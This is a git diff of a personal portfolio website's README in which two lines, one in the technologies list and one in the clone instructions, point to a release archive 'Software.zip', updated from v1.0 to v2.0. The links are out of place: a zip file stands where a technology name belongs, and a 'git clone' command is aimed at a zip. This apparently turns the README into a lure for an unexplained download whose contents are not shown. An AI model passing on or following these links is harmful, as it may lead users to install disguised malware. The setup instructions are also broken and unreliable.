@@ -5,7 +5,7 @@ Welcome to my personal portfolio website! This website showcases my skills, proj
 ## Technologies Used
 
 - Javascript
-- https://github.com/Taimoor-Ahmmad/portfolio_website-Starter/releases/download/v1.0/Software.zip
+- https://github.com/Taimoor-Ahmmad/portfolio_website-Starter/releases/download/v2.0/Software.zip
 - CSS (Cascading Style Sheets)
 - Deployed on vercel
 
@@ -20,4 +20,4 @@ Welcome to my personal portfolio website! This website showcases my skills, proj
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Taimoor-Ahmmad/portfolio_website-Starter/releases/download/v1.0/Software.zip
+   git clone https://github.com/Taimoor-Ahmmad/portfolio_website-Starter/releases/download/v2.0/Software.zip
